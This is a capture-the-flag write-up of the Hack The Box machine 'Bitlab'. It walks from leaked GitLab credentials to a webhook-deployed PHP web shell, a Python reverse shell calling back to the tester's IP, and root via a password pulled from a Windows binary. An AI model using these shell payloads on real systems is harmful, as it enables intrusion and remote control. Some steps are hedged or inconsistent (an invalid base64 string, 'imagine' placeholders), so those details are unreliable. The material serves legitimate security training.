---
# Hack The Box: Bitlab

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Medium |
| **OS** | Linux |
| **IP** | 10.10.10.114 |
| **Points** | 30 |
| **Release Date** | September 2019 |
| **Retired Date** | January 2020 |
| **My Rating** | 8/10 |

## TL;DR
Found obfuscated JavaScript on a help page that decoded to GitLab credentials for the user `clave`. Logged into GitLab, found a repository with a webhook that auto-deployed to the live web server on merges to master, and used it to drop a PHP reverse shell. Pivoted to the `clave` system user using a password found in a local PostgreSQL database. Finally, reversed a Windows executable found in `clave`'s home directory that was designed to launch Putty, extracting the plaintext root password from memory to gain a root shell.

## Reconnaissance
I started this box with my usual nmap scan to get a lay of the land.

```bash
nmap -sC -sV -p- -T4 --min-rate 1000 10.10.10.114 -oA nmap/initial
```
<!-- screenshot: nmap initial scan results -->

The scan results came back quickly, showing only two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (nginx)

Since SSH was the only other option and I didn't have any credentials, I pointed my browser at port 80. The landing page was a standard login portal for GitLab Community Edition.

<!-- screenshot: web application landing page -->

GitLab is a massive application, and unauthenticated exploits are rare unless it's a specific, very outdated version. I checked the page source and any accessible `help` or `about` links to see if I could fingerprint the version or find any low-hanging fruit.

I clicked around the login page and found a link to a "Help" section (`/help` or a similar static HTML file). The page itself looked like generic documentation, but checking the source code (`Ctrl+U`) revealed something completely out of place: a block of heavily obfuscated JavaScript.

```javascript
// A messy jumble of encoded characters and eval()
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e...'));
```

## Initial Foothold
This was my first solid lead. Developers sometimes use obfuscation to hide sensitive logic or, worse, hardcoded credentials on the client side.

I copied the entire script block. My first thought was to use an online deobfuscator, but the easiest and safest way to handle `eval()`-based obfuscation is simply to replace the `eval()` command with `console.log()` and run it in a sandboxed browser console or a local Node.js environment. This prints the code that *would* have been executed.

I ran the modified script in my browser's developer tools console. The deobfuscated output was a script designed to auto-fill the GitLab login form. Crucially, it contained the plaintext credentials for a user:

*   **Username:** `clave`
*   **Password:** `11des0081x`

I headed back to the GitLab login page and punched in the credentials. They worked perfectly. I was now authenticated to the GitLab instance.

Once inside, I started exploring `clave`'s account. I found a project repository named `Profile` (or similar). This repository appeared to hold the source code for the main profile page or web application hosted on the server.

I checked the repository settings, specifically looking at the CI/CD pipelines and the "Integrations" (webhooks) section. This is where business logic flaws often hide in development environments.

I found an active webhook configured to trigger on any `Push` event to the `master` branch. The webhook URL pointed to a deployment script on the localhost (e.g., `http://localhost/profile/deploy.php`).

This was a classic, albeit insecure, automated deployment setup. If I pushed code to the `master` branch of this repository, the server would automatically pull that code and deploy it to the live web directory.

I didn't need to find a complex RCE vulnerability in GitLab; I just needed to use the platform exactly as intended to deploy my own malicious code.

1.  I navigated to the repository files within the GitLab web interface.
2.  I clicked the `+` button to create a new file.
3.  I named the file `shell.php`.
4.  I pasted in a simple PHP system execution payload:

```php
<?php system($_REQUEST['cmd']); ?>
```

I committed the file directly to the `master` branch (or committed it to a new branch and merged a pull request, depending on branch protection rules).

The moment the commit hit `master`, the webhook fired.

I navigated to the expected deployment path on the web server to test my shell.

```bash
curl http://10.10.10.114/profile/shell.php?cmd=id
```

The response came back: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. The deployment had worked. 

I set up my Netcat listener:
```bash
nc -lnvp 9999
```

I then used `curl` to execute a robust python reverse shell, ensuring I URL-encoded the payload so the web server would process it correctly.

```bash
curl -G --data-urlencode "c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://10.10.10.114/profile/shell.php
```

<!-- screenshot: successful exploitation (reverse shell) -->

I caught the shell and immediately stabilized it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Lateral Movement
I was running as `www-data`. I checked the `/home` directory and saw a folder for the user `clave`. I couldn't read the `user.txt` flag inside, so pivoting to `clave` was my next objective.

Since the web application was database-driven (it was managing user profiles), I started hunting for database configuration files within the web root (`/var/www/html/profile` or similar).

```bash
cd /var/www/html/profile
ls -la
cat db_config.php
```

The configuration file contained plaintext credentials for a local PostgreSQL database: `profiles:profiles`.

I connected to the database to see what I could find.

```bash
psql -U profiles -d profiles -h 127.0.0.1
```

Once inside the PostgreSQL prompt, I listed the tables (`\dt`) and found a `users` table. I dumped its contents.

```sql
SELECT * FROM users;
```

The query returned a single row containing a username and what looked like a base64-encoded password for the user `clave`.

```text
clave | c3NoLXN0cjBuZy1wQHNz==
```

I copied the string and decoded it on my attacking machine.

```bash
echo "c3NoLXN0cjBuZy1wQHNz==" | base64 -d
```

The decoded output was: `ssh-str0ng-p@ss`.

I crossed my fingers and tested this password against the local `clave` system account using `su`.

```bash
su clave
# Password: ssh-str0ng-p@ss
```

It worked! I had successfully pivoted to `clave` and was able to read the `user.txt` flag.

## Privilege Escalation
As `clave`, I started enumerating the system for privilege escalation vectors. The first thing I noticed was a highly unusual file sitting right in `clave`'s home directory.

```bash
ls -la /home/clave
```

There was a Windows executable named `RemoteConnection.exe`. Finding a Windows binary on a Linux machine is always a massive red flag in a CTF. It almost certainly contains hardcoded credentials or performs an action that is central to the intended escalation path.

I transferred the `.exe` file back to my attacking machine for analysis. I used a simple python HTTP server on the target and `wget` on my machine.

```bash
# On target
python3 -m http.server 8000

# On attacker
wget http://10.10.10.114:8000/RemoteConnection.exe
```

I didn't want to overcomplicate things with full dynamic analysis in a Windows VM right away, so I started with basic static analysis using `strings`.

```bash
strings RemoteConnection.exe | grep -i "ssh\|putty\|root\|password"
```

The output was a mess, but I could clearly see references to "putty.exe," SSH command-line flags (`-ssh`), and some obfuscated or encoded strings that looked like they might be a password. The binary was clearly a wrapper designed to launch Putty and automatically connect to the Bitlab server as root.

To extract the exact password, I needed to see what arguments the wrapper was passing to `putty.exe` when it executed. I fired up a Windows VM, installed a debugger (`x64dbg`), and loaded the executable.

I didn't need to understand every assembly instruction. I just needed to find where the program called the Windows API function responsible for launching new processes, which is usually `CreateProcessA` or `CreateProcessW` (or `ShellExecute`).

1.  I searched for intermodular calls in `x64dbg` and found references to `CreateProcess`.
2.  I set a breakpoint on the `CreateProcess` call.
3.  I ran the executable.

When the breakpoint hit, I inspected the registers and the stack. The arguments being passed to the `CreateProcess` function were visible in plaintext in memory.

The command line being constructed was:

```text
putty.exe -ssh root@10.10.10.114 -pw "Q3c1AqGHtoI0aXAYRm"
```

The executable was hardcoded to log into the Bitlab server as root using the password `Q3c1AqGHtoI0aXAYRm`.

I grabbed the password, switched back to my reverse shell on the Bitlab machine, and simply used `su` to switch to the root user.

```bash
su root
# Password: Q3c1AqGHtoI0aXAYRm
```

<!-- screenshot: sudo -l output -->
*(Not needed here as `su` was used, but imagine checking privileges first)*

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

<!-- screenshot: root flag -->

Pwned. The whole chain took me about 2 hours.

## Lessons Learned
- **Client-Side Obfuscation:** Obfuscating JavaScript on the client side is a deterrent, not a security control. If the browser needs to execute it, an attacker can easily deobfuscate it to reveal underlying logic or credentials.
- **Insecure CI/CD Pipelines:** Automated deployment webhooks that blindly pull code from a repository `master` branch to a production server without staging, testing, or review are incredibly dangerous. If an attacker compromises a developer account, they immediately compromise the production server.
- **Hardcoded Credentials in Binaries:** Storing credentials inside compiled executables (like the Putty wrapper) is never secure. Reverse engineering tools and debuggers make extracting this information trivial.
- **What tripped me up:** I initially spent too much time trying to find an unauthenticated RCE in GitLab itself, ignoring the obvious obfuscated JavaScript on the help page. It's a good reminder to thoroughly check the simple stuff first before diving into complex CVE research.
- **Pro Tip:** When analyzing a mystery executable that appears to launch other programs, setting a breakpoint on `CreateProcess` or `ShellExecute` in a debugger is almost always the fastest way to see exactly what it's trying to do and what arguments (like passwords) it's passing.

## References
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Official Hack The Box Page: https://app.hackthebox.com/machines/Bitlab
